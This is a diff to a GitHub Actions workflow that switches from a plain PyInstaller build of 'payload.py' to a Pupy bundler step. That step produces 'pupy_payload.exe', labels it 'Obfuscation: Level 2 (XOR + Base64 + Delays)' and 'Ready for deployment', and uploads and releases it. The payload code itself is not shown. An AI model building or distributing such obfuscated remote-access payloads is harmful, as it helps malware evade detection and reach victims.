@@ -1,11 +1,11 @@
-name: Build Windows PE Binary
+name: Build Windows PE Binary with Pupy
 
 on:
   push:
     paths:
       - 'payload.py'
     branches: [ main, master ]
-  workflow_dispatch:  # Manual trigger
+  workflow_dispatch:
 
 jobs:
   build-windows:
@@ -24,46 +24,46 @@ jobs:
         python -m pip install --upgrade pip
         pip install pyinstaller pycryptodome
     
-    - name: Build Windows PE executable
+    - name: Build Pupy Obfuscated Binary
       run: |
-        pyinstaller --onefile --console --distpath ./dist payload.py
+        cd src
+        python -m pupy_bundler
     
     - name: Verify PE binary format
       run: |
-        $bytes = [System.IO.File]::ReadAllBytes("dist/payload.exe")
+        $bytes = [System.IO.File]::ReadAllBytes("dist\pupy_payload.exe")
         $magic = "{0:X2}{1:X2}" -f $bytes[0], $bytes[1]
         Write-Host "📊 Magic bytes: $magic"
         if ($magic -eq "4D5A") {
           Write-Host "✅ Valid PE x64 binary!"
-          Write-Host "🎉 Windows compilation successful!"
+          Write-Host "🎉 Pupy payload compiled successfully!"
         } else {
           Write-Host "❌ Invalid PE format!"
-          Write-Host "Expected: 4D5A (MZ)"
-          Write-Host "Got: $magic"
           exit 1
         }
     
     - name: Display binary info
       run: |
-        $file = "dist/payload.exe"
+        $file = "dist\pupy_payload.exe"
         $size = (Get-Item $file).Length / 1MB
         Write-Host "📦 Binary information:"
-        Write-Host "  ├─ Name: payload.exe"
+        Write-Host "  ├─ Name: pupy_payload.exe"
         Write-Host "  ├─ Size: $([Math]::Round($size, 2)) MB"
         Write-Host "  ├─ Format: PE x64 (Windows)"
-        Write-Host "  └─ Status: ✅ Ready for deployment"
+        Write-Host "  ├─ Status: ✅ Ready for deployment"
+        Write-Host "  └─ Obfuscation: Level 2 (XOR + Base64 + Delays)"
     
     - name: Upload Windows binary
       uses: actions/upload-artifact@v4
       with:
         name: payload-windows-pe
-        path: dist/payload.exe
+        path: dist/pupy_payload.exe
         retention-days: 30
     
     - name: Create Release (on tag)
       uses: softprops/action-gh-release@v1
       if: startsWith(github.ref, 'refs/tags/')
       with:
-        files: dist/payload.exe
+        files: dist/pupy_payload.exe
       env:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
